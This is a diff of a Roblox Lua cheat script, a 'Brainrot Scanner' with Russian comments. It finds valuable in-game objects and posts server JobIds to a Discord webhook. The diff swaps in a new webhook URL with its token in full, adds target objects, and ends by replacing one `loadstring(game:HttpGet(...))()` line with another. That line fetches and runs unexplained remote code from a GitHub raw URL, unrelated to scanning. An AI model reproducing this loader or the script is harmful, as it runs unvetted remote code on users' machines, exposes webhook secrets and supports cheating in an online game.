@@ -9,7 +9,7 @@ local HttpService = game:GetService('HttpService')
 -- ⚙️ НАСТРОЙКИ
 local INCOME_THRESHOLD = 50_000_000 -- 50M/s минимум для уведомления
 local HIGH_PRIORITY_THRESHOLD = 500_000_000 -- 500M/s для особо важных объектов
-local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1428482450383704148/27tN2Px4cKWy-ei307vNhGhrhIpAenzmGrnPAuRbt8xg6tMYCO-wzDAalNDDaMRZ14PV'
+local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1424146317604687932/G5mtYy3JUjj0I8OQxIyxBDfr2oU0tHGe96R00BnoUDeRGukoPeSYn4AJBAnCrHJz0da4'
 
 print('🎯 Brainrot Scanner v2.0 | JobId:', game.JobId)
 
@@ -37,8 +37,14 @@ local OBJECTS = {
     ['Spooky and Pumpky'] = { emoji = '🎃', important = true, },
     ['La Spooky Grande'] = { emoji = '👻', important = true, high_priority = true },
     ['Meowl'] = { emoji = '🐈', important = true },
+    ['Chipso And Queso'] = { emoji = '🧀', important = true, high_priority = true },
     ['La Casa Boo'] = { emoji = '👁‍🗨', important = true },
     ['Headless Horseman'] = { emoji = '🐴', important = true },
+    ['Mariachi Corazoni'] = { emoji = '💀', important = true },
+    ['Los Tacoritas'] = { emoji = '🚴', important = true },
+    ['Tacorita Bicicleta'] = { emoji = '🚵‍♂️', important = true },
+    ['Capitano Moby'] = { emoji = '🚢', important = true },
+    ['La Taco Combinasion'] = { emoji = '👒', important = true },
 }
 
 -- Создаем списки важных объектов
@@ -554,4 +560,4 @@ end)
 
 print('💡 Нажмите F для повторного сканирования')
 print('📱 Discord webhook готов к отправке уведомлений')
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MrStasGames228/asddsa/refs/heads/main/zahod.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/piskastroi1-ui/SSik/refs/heads/main/ss2.lua"))()
